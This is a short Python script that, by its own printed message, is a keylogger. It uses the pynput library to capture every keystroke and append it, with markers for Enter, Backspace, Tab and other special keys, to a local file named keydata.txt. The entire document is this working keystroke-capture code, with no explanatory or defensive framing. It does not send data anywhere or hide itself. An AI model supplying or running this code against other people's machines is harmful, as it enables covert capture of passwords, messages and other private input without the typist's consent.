from pynput import keyboard

def keyPress(key):
    with open("keydata.txt", 'a') as logKey:
        try:
            if hasattr(key, 'char') and key.char is not None:
                logKey.write(key.char)
            elif key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('[ENTER]\n')
            elif key == keyboard.Key.backspace:
                logKey.write('[BACKSPACE]')
            elif key == keyboard.Key.tab:
                logKey.write('[TAB]')
            elif key == keyboard.Key.esc:
                logKey.write('[ESC]')
            else:
                logKey.write(f'[{key}]')
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    try:
        with keyboard.Listener(on_press=keyPress) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
    except Exception as e:
        print(f"Unexpected error: {e}")
    finally:
        print("Exiting the program...")
